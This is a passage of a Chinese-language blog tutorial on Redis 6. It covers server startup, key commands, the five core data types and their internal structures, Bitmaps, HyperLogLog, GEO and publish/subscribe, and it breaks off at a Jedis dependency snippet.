class="line"><span class="meta prompt_">#</span><span class="language-bash"><span class="comment"># 指定配置文件启动</span></span></span><br><span class="line">[root@nanzx redis-6.2.6]# redis-server redis.conf</span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash"><span class="comment"># 查看redis进程是否启动成功</span></span></span><br><span class="line">[root@nanzx redis-6.2.6]# ps -ef|grep redis</span><br><span class="line">root      39242      1  0 23:27 ?        00:00:00 redis-server 127.0.0.1:6379</span><br><span class="line">root      39336  15470  0 23:28 pts/0    00:00:00 grep --color=auto redis</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash"><span class="comment"># 用客户端访问并进行测试验证：</span></span></span><br><span class="line">[root@nanzx redis-6.2.6]# redis-cli </span><br><span class="line">127.0.0.1:6379&gt; ping</span><br><span class="line">PONG</span><br><span class="line">127.0.0.1:6379&gt;</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash"><span class="comment"># 可以在客户端内关闭：</span></span></span><br><span class="line">[root@nanzx redis-6.2.6]# redis-cli </span><br><span class="line">127.0.0.1:6379&gt; shutdown</span><br><span class="line">not connected&gt; </span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash"><span class="comment"># 也可以这样单实例关闭：</span></span></span><br><span class="line">[root@nanzx redis-6.2.6]# redis-cli shutdown</span><br></pre></td></tr></table></figure><h1 id="常用五大数据类型"><a href="#常用五大数据类型" class="headerlink" title="常用五大数据类型"></a>常用五大数据类型</h1><p>redis常见数据类型操作命令：<a href="http://www.redis.cn/commands.html">http://www.redis.cn/commands.html</a></p><p><strong>Redis键(key)操作：</strong></p><ul><li>keys *：查看当前库所有key   (匹配：keys *1)</li><li>exists key：判断某个key是否存在</li><li>type key： 查看key是什么类型，例如string，list等</li><li>object encoding key：查看数据结构，例如list包含了linkedlist和ziplist两种数据结构。</li><li>del key：删除指定的key数据</li><li>unlink key：根据value选择非阻塞删除，仅将keys从keyspace元数据中删除，真正的删除会在后续异步操作。</li><li>expire key 10 ：为给定的key设置过期时间为10秒钟</li><li>ttl key：查看还有多少秒过期，-1表示永不过期，-2表示已过期，大于0表示剩余过期时间</li><li>select 1：切换数据库为索引为1的数据库</li><li>dbsize：查看当前数据库的key的数量</li><li>flushdb：清空当前库</li><li>flushall：通杀全部库</li></ul><blockquote><p>返回值nil表示空</p></blockquote><h2 id="字符串-String"><a href="#字符串-String" class="headerlink" title="字符串(String)"></a>字符串(String)</h2><p>String是Redis最基本的类型，一个key对应一个value。</p><p>String类型是<strong>二进制安全</strong>的。意味着Redis的string可以包含任何数据。比如jpg图片或者序列化的对象。</p><p>String类型是Redis最基本的数据类型，一个Redis中字符串value最多可以是<strong>512M</strong>。</p><p><strong>内部编码：</strong>raw、int、embstr</p><p><strong>常用命令：</strong></p><ul><li><p>set  <key><value>：添加键值对，如果 key 已经保存了一个值，那么这个操作会直接覆盖原来的值。提供选项操作：</p><ul><li>ex seconds：为键设置秒级过期时间</li><li>px milliseconds： 为键设置毫秒级过期时间</li><li>nx：键必须不存在才可以设置成功，用于添加</li><li>xx：键必须存在才可以设置成功，用于更新</li></ul></li><li><p>get  <key>：查询对应键值</p></li><li><p>append  <key><value>：将给定的<value> 追加到原值的末尾</p></li><li><p>strlen  <key>：获得值的长度</p></li><li><p>setnx  <key><value>：只有在 key 不存在时才设置 key 的值</p></li><li><p>incr  <key>：将 key 中储存的数字值增1，只能对数字值操作，如果为空，新增值为1</p></li><li><p>decr  <key>：将 key 中储存的数字值减1，只能对数字值操作，如果为空，新增值为-1</p></li><li><p>incrby &#x2F; decrby  <key>&lt;步长&gt;：将 key 中储存的数字值增减。自定义步长。</p></li><li><p>mset  <key1><value1><key2><value2> ….. ：同时设置一个或多个键值对  </p></li><li><p>mget  <key1><key2><key3> …..：同时获取一个或多个 value  </p></li><li><p>msetnx  <key1><value1><key2><value2> ….. ：同时设置一个或多个键值对，当且仅当所有给定key都不存在时才设置。</p></li><li><p>getrange  <key>&lt;起始位置&gt;&lt;结束位置&gt;：获得值的范围，位置<strong>前包后包，索引从0开始</strong></p></li><li><p>setrange  <key>&lt;起始位置&gt;<value>：用 <value>  覆写<key>所储存的字符串值，从&lt;起始位置&gt;开始。</p></li><li><p>setex  <key>&lt;过期时间&gt;<value>：设置键值的同时，设置过期时间，单位秒。</p></li><li><p>getset <key><value>：以新换旧，设置了新值同时获得旧值。</p></li></ul><p><strong>数据结构：</strong></p><p>String的数据结构为简单动态字符串(Simple Dynamic String，缩写SDS)。是可以修改的字符串，内部结构实现上类似于Java的ArrayList，采用<strong>预分配冗余空间</strong>的方式来减少内存的频繁分配。</p><p><img src= "https://unpkg.com/nan-picture/img/load.gif" data-lazy-src="https://unpkg.com/nan-picture/blog/20220201160415.png"></p><p>如图中所示，内部为当前字符串实际分配的空间capacity一般要高于实际字符串长度len。当字符串长度小于1M时，扩容都是加倍现有的空间，如果超过1M，扩容时一次只会多扩1M的空间。需要注意的是字符串最大长度为512M。</p><h2 id="列表-List"><a href="#列表-List" class="headerlink" title="列表(List)"></a>列表(List)</h2><p>Redis 列表是简单的字符串列表，特点是<strong>单键多值</strong>，按照<strong>插入顺序</strong>排序。</p><p>你可以添加一个元素到列表的头部（左边）或者尾部（右边）。</p><p>它的底层实际是个<strong>双向链表</strong>，对两端的操作性能很高，通过索引下标的操作中间的节点性能会较差。</p><p><img src= "https://unpkg.com/nan-picture/img/load.gif" data-lazy-src="https://unpkg.com/nan-picture/blog/20220203150003.png"></p><p><strong>常用命令：</strong></p><ul><li><p>lpush&#x2F;rpush  <key><value1><value2><value3>…. ：从左边&#x2F;右边插入一个或多个值。</p></li><li><p>lpop&#x2F;rpop  <key>：从左边&#x2F;右边<strong>吐</strong>出一个值。<strong>值在键在，值光键亡</strong>。</p></li><li><p>rpoplpush  <key1><key2>：从<key1>列表右边<strong>吐</strong>出一个值，插到<key2>列表左边。</p></li><li><p>lrange <key><start><stop>：按照索引下标获得元素(从左到右)</p><ul><li>lrange mylist 0 -1  0左边第一个，-1右边第一个，（0-1表示获取所有）</li></ul></li><li><p>lindex <key><index>：按照索引下标获得元素(从左到右)</p></li><li><p>llen <key>：获得列表长度 </p></li><li><p>linsert <key>  before <value><newvalue>：在<value>的前面插入<newvalue>插入值</p></li><li><p>lrem <key><n><value>：从左边删除n个value(从左到右)</p></li><li><p>lset<key><index><value>：将列表key下标为index的值替换成value</p></li></ul><p><strong>数据结构：</strong></p><p>List的数据结构为快速链表quickList。</p><p>首先在列表元素较少的情况下会使用一块<strong>连续</strong>的内存存储，这个结构是ziplist，也即是压缩列表。它将所有的元素紧挨着一起存储，分配的是一块连续的内存。</p><p>当数据量比较多的时候才会改成quicklist。因为普通的链表需要的附加指针空间太大，会比较浪费空间。比如这个列表里存的只是int类型的数据，结构上还需要两个额外的指针prev和next。</p><p><img src= "https://unpkg.com/nan-picture/img/load.gif" data-lazy-src="https://unpkg.com/nan-picture/blog/20220203154012.png"></p><p>Redis将<strong>链表和ziplist结合起来组成了quicklist</strong>。也就是将多个ziplist使用双向指针串起来使用。这样既满足了快速的插入删除性能，又不会出现太大的空间冗余。</p><h2 id="集合-Set"><a href="#集合-Set" class="headerlink" title="集合(Set)"></a>集合(Set)</h2><p>Redis set对外提供的功能与list类似都是一个列表的功能，特殊之处在于set是可以<strong>自动排重</strong>的，当你需要存储一个列表数据，又不希望出现重复数据时，set是一个很好的选择，并且set提供了判断某个成员是否在一个set集合内的重要接口，这个也是list所不能提供的。</p><p>Redis的Set是string类型的<strong>无序集合</strong>。它底层其实是一个value为null的hash表，所以添加、删除和查找的复杂度都是O(1)。</p><p>一个算法，随着数据的增加，执行时间的长短，如果是O(1)，数据增加，查找数据的时间不变。</p><p><strong>常用命令：</strong></p><ul><li><p>sadd <key><value1><value2>….. ：将一个或多个元素加入到集合key中，已经存在的元素将被忽略</p></li><li><p>smembers <key>：取出该集合的所有值。</p></li><li><p>sismember <key><value>：判断集合<key>是否为含有该<value>值，有1，没有0</p></li><li><p>scard<key>：返回该集合的元素个数。</p></li><li><p>srem <key><value1><value2> …. ：删除集合中的某个元素。</p></li><li><p>spop <key>：随机从该集合中<strong>吐</strong>出一个值。</p></li><li><p>srandmember <key><n>：随机从该集合中取出n个值。不会从集合中删除 。</p></li><li><p>smove <source><destination><value>：把集合中一个值从一个集合移动到另一个集合</p></li><li><p>sinter <key1><key2>：返回两个集合的交集元素。</p></li><li><p>sunion <key1><key2>：返回两个集合的并集元素。</p></li><li><p>sdiff <key1><key2>：返回两个集合的差集元素(key1中的，不包含key2中的)</p></li></ul><p><strong>数据结构：</strong></p><p>Set数据结构是dict字典，字典是用哈希表实现的。</p><p>Java中HashSet的内部实现使用的是HashMap，只不过所有的value都指向同一个对象。Redis的set结构也是一样，它的内部也使用hash结构，所有的value都指向同一个内部值。</p><h2 id="哈希-Hash"><a href="#哈希-Hash" class="headerlink" title="哈希(Hash)"></a>哈希(Hash)</h2><p>Redis hash 是一个键值对集合，是一个string类型的field和value的映射表，hash特别适合用于<strong>存储对象</strong>。类似Java里面的Map&lt;String,Object&gt;</p><p>用户ID为查找的key，存储的value用户对象包含姓名，年龄，生日等信息，如果用普通的key&#x2F;value结构来存储主要有以下2种存储方式：</p><ul><li>每次修改用户的某个属性需要，先反序列化改好后再序列化回去。开销较大。</li></ul><p><img src= "https://unpkg.com/nan-picture/img/load.gif" data-lazy-src="https://unpkg.com/nan-picture/blog/20220203192359.png"></p><ul><li>用户ID数据冗余</li></ul><p><img src= "https://unpkg.com/nan-picture/img/load.gif" data-lazy-src="https://unpkg.com/nan-picture/blog/20220203192407.png"></p><p>通过 key(用户ID) + field(<strong>属性标签)</strong> 就可以操作对应属性数据了，既不需要重复存储数据，也不会带来序列化和并发修改控制的问题</p><p><img src= "https://unpkg.com/nan-picture/img/load.gif" data-lazy-src="https://unpkg.com/nan-picture/blog/20220203192438.png"></p><p><strong>常用命令：</strong></p><ul><li><p>hset <key><field><value>：给<key>集合中的 <field>键赋值<value></p></li><li><p>hget <key1><field>：从<key1>集合<field>取出 value </p></li><li><p>hmset <key1><field1><value1><field2><value2>… ：批量设置hash的值</p></li><li><p>hexists <key1><field>：查看哈希表 key 中，给定域 field 是否存在。 </p></li><li><p>hkeys <key>：列出该hash集合的所有field</p></li><li><p>hvals <key>：列出该hash集合的所有value</p></li><li><p>hincrby <key><field><increment>：为哈希表 key 中的域 field 的值加上增量</p></li><li><p>hsetnx <key><field><value>：将哈希表 key 中的域 field 的值设置为 value ，当且仅当域 field 不存在 .</p></li></ul><p><strong>数据结构：</strong></p><p>Hash类型对应的数据结构有两种：ziplist（压缩列表），hashtable（哈希表）。当field-value长度较短且个数较少时，使用ziplist，否则使用hashtable。</p><h2 id="有序集合-Zset"><a href="#有序集合-Zset" class="headerlink" title="有序集合(Zset)"></a>有序集合(Zset)</h2><p>Redis有序集合zset与普通集合set非常相似，是一个<strong>没有重复元素</strong>的字符串集合。</p><p>不同之处是有序集合的每个成员都关联了一个评分（score），这个评分（score）<strong>默认</strong>被用来按照从最低分到最高分的方式排序集合中的成员。<strong>集合的成员是唯一的，但是评分可以是重复了 。</strong></p><p>因为元素是有序的，所以你也可以很快的根据评分（score）或者次序（position）来获取一个范围的元素。</p><p>访问有序集合的中间元素也是非常快的，因此你能够使用有序集合作为一个没有重复成员的智能列表。</p><p><strong>常用命令：</strong></p><ul><li><p>zadd  <key><score1><value1><score2><value2>…：将一个或多个 member 元素及其 score 值加入到有序集 key 当中。</p></li><li><p>zrange <key><start><stop>  [WITHSCORES] ：返回有序集 key 中，下标在<start><stop>之间的元素[<strong>全包含的区间</strong>]</p><ul><li>带WITHSCORES，可以让分数一起和值返回到结果集。</li></ul></li><li><p>zrangebyscore <key><min><max> [withscores] [limit offset count]：返回有序集 key 中，所有 score 值介于 min 和 max 之间(包括等于 min 或 max )的成员。有序集成员按 score 值递增(从小到大)次序排列。 </p></li><li><p>zrevrangebyscore <key><max><min> [withscores] [limit offset count] ：同上，改为从大到小排列。 </p></li><li><p>zincrby <key><increment><value>：为元素的score加上增量</p></li><li><p>zrem  <key><value>：删除该集合下，指定值的元素 </p></li><li><p>zcount <key><min><max>：统计该集合，分数区间内的元素个数 </p></li><li><p>zrank <key><value>：返回该值在集合中的排名，从0开始</p></li></ul><p><strong>数据结构：</strong></p><p>SortedSet(zset)是Redis提供的一个非常特别的数据结构，一方面它等价于Java的数据结构Map&lt;String, Double&gt;，可以给每一个元素value赋予一个权重score，另一方面它又类似于TreeSet，内部的元素会按照权重score进行排序，可以得到每个元素的名次，还可以通过score的范围来获取元素的列表。</p><p>zset底层使用了两个数据结构</p><p>（1）hash，作用就是关联元素value和权重score，保障元素value的唯一性，可以通过元素value找到相应的score值。</p><p>（2）跳跃表，跳跃表的目的在于给元素value排序，根据score的范围获取元素列表。</p><p><strong>跳跃表（跳表）：</strong></p><p>1、简介</p><p>​有序集合在生活中比较常见，例如根据成绩对学生排名，根据得分对玩家排名等。对于有序集合的底层实现，可以用数组、平衡树、链表等。数组不便元素的插入、删除；平衡树或红黑树虽然效率高但结构复杂；链表查询需要遍历所有效率低。Redis采用的是跳跃表。跳跃表效率堪比红黑树，实现远比红黑树简单。</p><p>2、实例</p><p>​对比有序链表和跳跃表，从链表中查询出51</p><p>（1） 有序链表要查找值为51的元素，需要从第一个元素开始依次查找、比较才能找到。共需要6次比较。</p><p><img src= "https://unpkg.com/nan-picture/img/load.gif" data-lazy-src="https://unpkg.com/nan-picture/blog/20220203213430.png"></p><p>（2） 跳跃表</p><p>从第2层开始，1节点比51节点小，向后比较。</p><p>21节点比51节点小，继续向后比较，后面就是NULL了，所以从21节点向下到第1层</p><p>在第1层，41节点比51节点小，继续向后，61节点比51节点大，所以从41向下</p><p>在第0层，51节点为要查找的节点，节点被找到，共查找4次。</p><p>从此可以看出跳跃表比有序链表效率要高</p><p><img src= "https://unpkg.com/nan-picture/img/load.gif" data-lazy-src="https://unpkg.com/nan-picture/blog/20220203213440.png"></p><h1 id="新数据类型"><a href="#新数据类型" class="headerlink" title="新数据类型"></a>新数据类型</h1><h2 id="Bitmaps-位图"><a href="#Bitmaps-位图" class="headerlink" title="Bitmaps(位图)"></a>Bitmaps(位图)</h2><p><strong>简介：</strong></p><p>现代计算机用二进制（位） 作为信息的基础单位， 1个字节等于8位， 例如“abc”字符串是由3个字节组成， 但实际在计算机存储时将其用二进制表示， “abc”分别对应的ASCII码分别是97、 98、 99， 对应的二进制分别是01100001、 01100010和01100011，如下图</p><p><img src= "https://unpkg.com/nan-picture/img/load.gif" data-lazy-src="https://unpkg.com/nan-picture/blog/20220206175611.png"></p><p>合理地使用操作位能够有效地提高内存使用率和开发效率。</p><p>Redis提供了Bitmaps这个“数据类型”可以实现对位的操作：</p><ul><li><p>Bitmaps本身不是一种数据类型， 实际上它就是字符串（key-value） ， 但是它可以对字符串的<strong>位</strong>进行操作。</p></li><li><p>Bitmaps单独提供了一套命令， 所以在Redis中使用Bitmaps和使用字符串的方法不太相同。 可以把Bitmaps想象成一个以位为单位的数组， 数组的每个单元只能存储0和1， 数组的下标在Bitmaps中叫做<strong>偏移量</strong>。</p></li></ul><p><img src= "https://unpkg.com/nan-picture/img/load.gif" data-lazy-src="https://unpkg.com/nan-picture/blog/20220206175745.png"></p><hr><p><strong>命令：</strong></p><p><code>setbit&lt;key&gt;&lt;offset&gt;&lt;value&gt;</code>：设置Bitmaps中某个偏移量的值（0或1），offset偏移量从0开始1</p><p><strong>实例：</strong>每个独立用户是否访问过网站存放在Bitmaps中， 将访问的用户记做1， 没有访问的用户记做0， 用偏移量作为用户的id。</p><p>设置键的第offset个位的值（从0算起） ， 假设现在有20个用户，userid&#x3D;1， 6， 11， 15， 19的用户对网站进行了访问， 那么当前Bitmaps初始化结果如图：</p><p><img src= "https://unpkg.com/nan-picture/img/load.gif" data-lazy-src="https://unpkg.com/nan-picture/blog/20220206180546.png"></p><p>unique:users:20220206代表2022-02-06这天的独立访问用户的Bitmaps：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">127.0.0.1:6379&gt; setbit unique:users:20220206 1 1</span><br><span class="line">(integer) 0</span><br><span class="line">127.0.0.1:6379&gt; setbit unique:users:20220206 6 1</span><br><span class="line">(integer) 0</span><br><span class="line">127.0.0.1:6379&gt; setbit unique:users:20220206 11 1</span><br><span class="line">(integer) 0</span><br><span class="line">127.0.0.1:6379&gt; setbit unique:users:20220206 15 1</span><br><span class="line">(integer) 0</span><br><span class="line">127.0.0.1:6379&gt; setbit unique:users:20220206 19 1</span><br><span class="line">(integer) 0</span><br></pre></td></tr></table></figure><blockquote><p><strong>注意：</strong></p><p>很多应用的用户id以一个指定数字（例如10000） 开头， 直接将用户id和Bitmaps的偏移量对应势必会造成一定的浪费， 通常的做法是每次做setbit操作时将用户id减去这个指定数字。</p><p>在第一次初始化Bitmaps时， 假如偏移量非常大， 那么整个初始化过程执行会比较慢， 可能会造成Redis的阻塞。</p></blockquote><hr><p><strong>命令：</strong></p><p><code>getbit&lt;key&gt;&lt;offset&gt;</code>：获取Bitmaps中某个偏移量的值，获取键的第offset位的值（从0开始算）</p><p><strong>实例：</strong></p><p>获取id&#x3D;8的用户是否在2022-02-06这天访问过， 返回0说明没有访问过：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">127.0.0.1:6379&gt; getbit unique:users:20220206 8</span><br><span class="line">(integer) 0</span><br><span class="line">127.0.0.1:6379&gt; getbit unique:users:20220206 1</span><br><span class="line">(integer) 1</span><br><span class="line">127.0.0.1:6379&gt; getbit unique:users:20220206 100</span><br><span class="line">(integer) 0</span><br></pre></td></tr></table></figure><hr><p><strong>命令：</strong></p><p><code>bitcount&lt;key&gt;[start end]</code> ：统计字符串被设置为1的bit数，可以通过指定额外的 start 或 end 参数，可以让计数只在特定的位上进行。start 和 end 参数的设置，都可以使用负数值：比如 -1 表示最后一个字节，而 -2 表示倒数第二个字节，start、end 是指bit组的<strong>字节</strong>的下标数，二者皆<strong>包含</strong>。</p><blockquote><p>注意：redis的setbit设置或清除的是bit位置，而bitcount计算的是<strong>byte位置</strong>。一个字节等于八位。</p></blockquote><p><strong>实例：</strong></p><p>计算2022-02-06这天的独立访问用户数量：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">127.0.0.1:6379&gt; bitcount unique:users:20220206</span><br><span class="line">(integer) 5</span><br></pre></td></tr></table></figure><p>start和end代表起始和结束字节数， 下面操作计算用户id在第1个字节到第3个字节之间的独立访问用户数， 对应的用户id是11， 15， 19。</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">127.0.0.1:6379&gt; bitcount unique:users:20220206 1 3</span><br><span class="line">(integer) 3</span><br></pre></td></tr></table></figure><p><img src= "https://unpkg.com/nan-picture/img/load.gif" data-lazy-src="https://unpkg.com/nan-picture/blog/20220206180546.png"></p><p>举例： K1 【01000001 01000000  00000000 00100001】，一个字节等于八位</p><ul><li><p><code>bitcount K1 1 2</code>： 统计下标第1个字节到第2字节中bit&#x3D;1的个数，即01000000  00000000 –》1</p></li><li><p><code>bitcount K1 1 3 </code>： 统计下标第1个字节到第2字节中bit&#x3D;1的个数，即01000000  00000000 00100001 –》3</p></li><li><p><code>bitcount K1 0 -2</code>： 统计下标第0个字节到下标倒数第2字节中bit&#x3D;1的个数，即01000001  01000000  00000000 –》3</p></li></ul><hr><p><strong>命令：</strong></p><p><code>bitop and(or/not/xor) &lt;destkey&gt; [key…]</code>：bitop是一个复合操作， 它可以做多个Bitmaps的and（交集） 、 or（并集） 、 not（非） 、 xor（异或） 操作并将结果保存在destkey中。【<a href="https://www.runoob.com/w3cnote/bit-operation.html">菜鸟教程-位运算</a>】</p><p><strong>实例：</strong></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">2022-02-06 日访问网站的userid=1，2，5，9。</span><br><span class="line">setbit unique:users:20220206 1 1</span><br><span class="line">setbit unique:users:20220206 2 1</span><br><span class="line">setbit unique:users:20220206 5 1</span><br><span class="line">setbit unique:users:20220206 9 1</span><br><span class="line"></span><br><span class="line">2022-02-07 日访问网站的userid=0，1，4，9。</span><br><span class="line">setbit unique:users:20220207 0 1</span><br><span class="line">setbit unique:users:20220207 1 1</span><br><span class="line">setbit unique:users:20220207 4 1</span><br><span class="line">setbit unique:users:20220207 9 1</span><br><span class="line"></span><br><span class="line">计算出两天都访问过网站的用户数量:</span><br><span class="line"><span class="meta prompt_">&gt; </span><span class="language-bash">bitop and unique:<span class="built_in">users</span>:and:20220206_07 unique:<span class="built_in">users</span>:20220206 unique:<span class="built_in">users</span>:20220207</span></span><br><span class="line">(integer) 2</span><br><span class="line"><span class="meta prompt_">&gt; </span><span class="language-bash">bitcount unique:<span class="built_in">users</span>:and:20220206_07</span></span><br><span class="line">(integer) 2</span><br><span class="line"></span><br><span class="line">计算出任意一天有访问过网站的用户数量（例如月活跃就是类似这种），可以使用or求并集</span><br></pre></td></tr></table></figure><hr><p><strong>Bitmaps与set对比：</strong></p><p>假设网站有1亿用户， 每天独立访问的用户有5千万， 如果每天用集合类型和Bitmaps分别存储活跃用户可以得到表</p><table><thead><tr><th>set和Bitmaps存储一天活跃用户对比</th><th></th><th></th><th></th></tr></thead><tbody><tr><td>数据类型</td><td>每个用户id占用空间</td><td>需要存储的用户量</td><td>全部内存量</td></tr><tr><td>集合类型</td><td>64位</td><td>50000000</td><td>64位*50000000 &#x3D; 400MB</td></tr><tr><td>Bitmaps</td><td>1位</td><td>100000000</td><td>1位*100000000 &#x3D; 12.5MB</td></tr></tbody></table><p>很明显， 这种情况下使用Bitmaps能节省很多的内存空间， 尤其是随着时间推移节省的内存还是非常可观的</p><table><thead><tr><th>set和Bitmaps存储独立用户空间对比</th><th></th><th></th><th></th></tr></thead><tbody><tr><td>数据类型</td><td>一天</td><td>一个月</td><td>一年</td></tr><tr><td>集合类型</td><td>400MB</td><td>12GB</td><td>144GB</td></tr><tr><td>Bitmaps</td><td>12.5MB</td><td>375MB</td><td>4.5GB</td></tr></tbody></table><p>但Bitmaps并不是万金油， 假如该网站每天的独立访问用户很少， 例如只有10万（大量的僵尸用户） ， 那么两者的对比如下表所示， 很显然， 这时候使用Bitmaps就不太合适了， 因为基本上大部分位都是0。</p><table><thead><tr><th>set和Bitmaps存储一天活跃用户对比（独立用户比较少）</th><th></th><th></th><th></th></tr></thead><tbody><tr><td>数据类型</td><td>每个userid占用空间</td><td>需要存储的用户量</td><td>全部内存量</td></tr><tr><td>集合类型</td><td>64位</td><td>100000</td><td>64位*100000 &#x3D; 800KB</td></tr><tr><td>Bitmaps</td><td>1位</td><td>100000000</td><td>1位*100000000 &#x3D; 12.5MB</td></tr></tbody></table><h2 id="HyperLogLog"><a href="#HyperLogLog" class="headerlink" title="HyperLogLog"></a>HyperLogLog</h2><p><strong>简介：</strong></p><p>在工作当中，我们经常会遇到与统计相关的功能需求，比如统计网站PV（PageView页面访问量），可以使用Redis的incr、incrby轻松实现。</p><p>但像UV（UniqueVisitor，独立访客）、独立IP数、搜索记录数等需要去重和计数的问题如何解决？这种求集合中不重复元素个数的问题称为<strong>基数问题</strong>。</p><p>解决基数问题有很多种方案：</p><p>（1）数据存储在MySQL表中，使用distinct count计算不重复个数</p><p>（2）使用Redis提供的hash、set、bitmaps等数据结构来处理</p><p>以上的方案结果精确，但随着数据不断增加，导致<strong>占用空间</strong>越来越大，对于非常大的数据集是不切实际的。</p><p>能否能够<strong>降低一定的精度</strong>来平衡存储空间？Redis推出了HyperLogLog</p><p>Redis HyperLogLog 是用来做基数统计的算法，HyperLogLog 的优点是，在输入元素的数量或者体积非常非常大时，<strong>计算基数所需的空间</strong>总是固定的、并且是很小的。</p><p>在 Redis 里面，每个 HyperLogLog 键只需要花费 12 KB 内存，就可以计算接近 2^64 个不同元素的基数。这和计算基数时，元素越多耗费内存就越多的集合形成鲜明对比。</p><p>但是，因为 HyperLogLog 只会根据输入元素来计算基数，而<strong>不会储存输入元素本身</strong>，所以 HyperLogLog 不能像集合那样，返回输入的各个元素。</p><blockquote><p>什么是基数?</p><p>比如数据集 {1, 3, 5, 7, 5, 7, 8}， 那么这个数据集的基数集为 {1, 3, 5 ,7, 8}, 基数(不重复元素个数)为5。 基数估计就是在误差可接受的范围内，快速计算基数。</p></blockquote><p><strong>命令：</strong></p><ul><li>pfadd <key>&lt; element&gt; [element …]： 添加指定元素到 HyperLogLog 中，如果执行命令后估计的近似基数发生变化，则返回1，否则返回0。</li><li>pfcount <key> [key …]：计算HLL的近似基数，可以计算多个HLL，比如用HLL存储每天的UV，计算一周的UV可以使用7天的UV合并计算即可。</li><li>pfmerge <destkey><sourcekey> [sourcekey …]：将一个或多个HLL合并后的结果存储在另一个HLL中，比如每月活跃用户可以使用每天的活跃用户来合并计算可得。</li></ul><h2 id="Geospatial-地理信息定位"><a href="#Geospatial-地理信息定位" class="headerlink" title="Geospatial(地理信息定位)"></a>Geospatial(地理信息定位)</h2><p><strong>简介：</strong></p><p>Redis 3.2 中增加了对GEO类型的支持。GEO(Geographic)是<strong>地理信息</strong>的缩写。该类型就是元素的2维坐标，在地图上就是经纬度。redis基于该类型，提供了经纬度设置，查询，范围查询，距离查询，经纬度Hash等常见操作。</p><p><strong>命令：</strong></p><ul><li><p>geoadd <key><longitude><latitude><member> [longitude latitude member…]：添加地理位置（经度，纬度，名称）</p><ul><li>两极无法直接添加，一般会下载城市数据，直接通过 Java 程序一次性导入。</li><li>有效的经度从 -180 度到 180 度。有效的纬度从 -85.05112878 度到 85.05112878 度。</li><li>当坐标位置超出指定范围时，该命令将会返回一个错误。</li><li>已经添加的数据，是无法再次往里面添加的。</li></ul></li><li><p>geopos  <key><member> [member…]：获得指定地区的坐标值</p></li><li><p>geodist <key><member1><member2>  [m|km|ft|mi ]：获取两个位置之间的直线距离</p><ul><li>m 表示单位为米[默认值]</li><li>km 表示单位为千米</li><li>mi 表示单位为英里</li><li>ft 表示单位为英尺</li></ul></li><li><p>georadius <key><longitude><latitude> radius m|km|ft|mi：以给定的经纬度为中心，找出某一半径内的元素</p></li></ul><h1 id="Redis的发布和订阅"><a href="#Redis的发布和订阅" class="headerlink" title="Redis的发布和订阅"></a>Redis的发布和订阅</h1><p>1、客户端可以订阅频道如下图</p><p><img src= "https://unpkg.com/nan-picture/img/load.gif" data-lazy-src="https://unpkg.com/nan-picture/blog/20220207173820.png"></p><p>2、当给这个频道发布消息后，消息就会发送给订阅的客户端</p><p><img src= "https://unpkg.com/nan-picture/img/load.gif" data-lazy-src="https://unpkg.com/nan-picture/blog/20220207173829.png"></p><p><strong>发布订阅命令行实现：</strong></p><p>1、 打开一个客户端订阅channel1</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">127.0.0.1:6379&gt; </span><br><span class="line">127.0.0.1:6379&gt; subscribe channel1</span><br><span class="line">Reading messages... (press Ctrl-C to quit)</span><br><span class="line">1) &quot;subscribe&quot;</span><br><span class="line">2) &quot;channel1&quot;</span><br><span class="line">3) (integer) 1</span><br></pre></td></tr></table></figure><p>2、打开另一个客户端，给channel1发布消息，返回的1是订阅者数量</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">127.0.0.1:6379&gt; publish channel1 &quot;hello world!&quot;</span><br><span class="line">(integer) 1</span><br></pre></td></tr></table></figure><p>3、打开第一个客户端可以看到发送的消息</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">127.0.0.1:6379&gt; subscribe channel1</span><br><span class="line">Reading messages... (press Ctrl-C to quit)</span><br><span class="line">1) &quot;subscribe&quot;</span><br><span class="line">2) &quot;channel1&quot;</span><br><span class="line">3) (integer) 1</span><br><span class="line">1) &quot;message&quot;</span><br><span class="line">2) &quot;channel1&quot;</span><br><span class="line">3) &quot;hello world!&quot;</span><br></pre></td></tr></table></figure><p><strong>注意：</strong>发布的消息没有持久化，只能收到订阅后发布的消息</p><h1 id="Java集成Jedis"><a href="#Java集成Jedis" class="headerlink" title="Java集成Jedis"></a>Java集成Jedis</h1><p>引入Jedis依赖：</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span 